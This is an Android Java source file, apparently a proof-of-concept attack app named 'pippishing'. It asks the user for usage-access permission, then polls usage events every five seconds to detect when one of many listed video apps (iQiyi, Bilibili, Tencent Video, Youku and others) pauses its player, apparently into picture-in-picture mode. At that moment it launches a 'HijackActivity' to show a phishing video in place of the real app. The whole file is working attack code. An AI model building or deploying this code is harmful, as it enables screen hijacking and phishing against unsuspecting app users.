package com.example.pippishing;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.app.AppOpsManager;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;

import java.util.Calendar;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "PIPPhishing";
    private Handler mHandler = null;
    private static final int POSTDELAYED_COUNTS = 5000;
    private static final String[] targetActivityArrays = {"org.iqiyi.video.activity.PlayerActivity",
            "com.ss.android.article.video.activity.SplashActivity",
            "com.bilibili.video.videodetail.VideoDetailsActivity",
            "com.tencent.qqlive.ona.activity.VideoDetailActivity",
            "com.youku.ui.activity.DetailActivity",
            "com.cmvideo.capability.vod.VodActivity",
            "com.tencent.videolite.android.business.videodetail.VideoDetailActivity",
            "com.cctv.mcctv.details.ui.activity.LiveVideoPlayerActivity",
            "com.baidu.netdisk.video.ui.preview.video.VideoPlayerActivity",
            "com.xunlei.downloadprovider.download.taskdetails.newui.DownloadDetailsXTaskActivity",
            "com.letv.android.client.album.AlbumPlayActivity",
            "com.youku.ui.activity.DetailActivity",
            "com.dianshijia.tvlive.livevideo.VideoDetailActivity",
            "org.iqiyi.video.activity.PlayerActivity",
            "com.example.toasttestdemo.JumpActivity"};
    private static final String[] targetServiceArrays = {"com.duowan.kiwi.background.impl.KeepAliveService"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //隐藏标题栏
        androidx.appcompat.app.ActionBar title_actionBar = getSupportActionBar();
        if (title_actionBar != null) {
            title_actionBar.hide();
        }
        //判断是否有权限
        if(canUsageStats(getApplicationContext())) {
            //监听工具
            mHandler = new Handler();
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    //监听PIP播放
                    boolean getTarget = false;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        if(isActivityTargetRunning(getApplicationContext())){
                            OpenPhishingVideo();
                            getTarget = true;
                        }
                    }
                    if(getTarget){
                        mHandler.removeCallbacks(this);}
                    else {
                        mHandler.postDelayed(this, POSTDELAYED_COUNTS);
                    }
                }
            });
        }else{
            startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS),809);
        }
    }

    private void OpenPhishingVideo(){
        Intent hijack = new Intent(this, HijackActivity.class);
        startActivity(hijack);
    }

    //能否使用UsageStat权限？
    public static boolean canUsageStats(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = 0;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            mode = appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.getPackageName());
        } else {
            mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.getPackageName());
        }
        if (mode == AppOpsManager.MODE_DEFAULT) {
            return (context.checkCallingOrSelfPermission(Manifest.permission.PACKAGE_USAGE_STATS) == PackageManager.PERMISSION_GRANTED);
        } else {
            return (mode == AppOpsManager.MODE_ALLOWED);
        }
    }

    //检测PIP是否在运行
    @RequiresApi(api = Build.VERSION_CODES.Q)
    public static boolean isActivityTargetRunning(Context context) {
        //Get the app record in the last month
        Calendar calendar = Calendar.getInstance();
        final long end = calendar.getTimeInMillis();
        calendar.add(Calendar.MONTH, -1);
        final long start = calendar.getTimeInMillis();
        UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        UsageEvents usageEvents = usageStatsManager.queryEvents(start, end);
        UsageEvents.Event event = new UsageEvents.Event();
        String className = null;
        int eventType = -1;
        boolean isRunnning = false;
        String runnningClassName = null;
        while (usageEvents.hasNextEvent()) {
            usageEvents.getNextEvent(event);
            className = event.getClassName();
            if(isRunnning){
                if(runnningClassName.equals(className)){
                    eventType = event.getEventType();
                    if(eventType == UsageEvents.Event.ACTIVITY_STOPPED){
                        isRunnning = false;
                    }
                }
                continue;
            }
            for (String targetActivityArray : targetActivityArrays) {
                if (targetActivityArray.equals(className)) {
                    eventType = event.getEventType();
                    if (eventType == UsageEvents.Event.ACTIVITY_PAUSED) {
                        isRunnning = true;
                        runnningClassName = className;
                    }
                    break;
                }
            }
        }
        return eventType == UsageEvents.Event.ACTIVITY_PAUSED;
    }

    //检测PIP是否在运行（Service驱动）
    @RequiresApi(api = Build.VERSION_CODES.Q)
    public static boolean isServiceTargetRunning(Context context) {
        //Get the app record in the last month
        Calendar calendar = Calendar.getInstance();
        final long end = calendar.getTimeInMillis();
        calendar.add(Calendar.MONTH, -1);
        final long start = calendar.getTimeInMillis();
        UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        UsageEvents usageEvents = usageStatsManager.queryEvents(start, end);
        UsageEvents.Event event = new UsageEvents.Event();
        String className = null;
        int eventType = -1;
        boolean isRunnning = false;
        String runnningClassName = null;
        while (usageEvents.hasNextEvent()) {
            usageEvents.getNextEvent(event);
            className = event.getClassName();
            if(isRunnning){
                if(runnningClassName.equals(className)){
                    eventType = event.getEventType();
                    if(eventType == UsageEvents.Event.FOREGROUND_SERVICE_STOP){
                        isRunnning = false;
                    }
                }
                continue;
            }
            for (String targetServiceArray : targetServiceArrays) {
                if (targetServiceArray.equals(className)) {
                    eventType = event.getEventType();
                    if (eventType == UsageEvents.Event.FOREGROUND_SERVICE_START) {
                        isRunnning = true;
                        runnningClassName = className;
                    }
                    break;
                }
            }
        }
        return eventType == UsageEvents.Event.FOREGROUND_SERVICE_START;
    }
}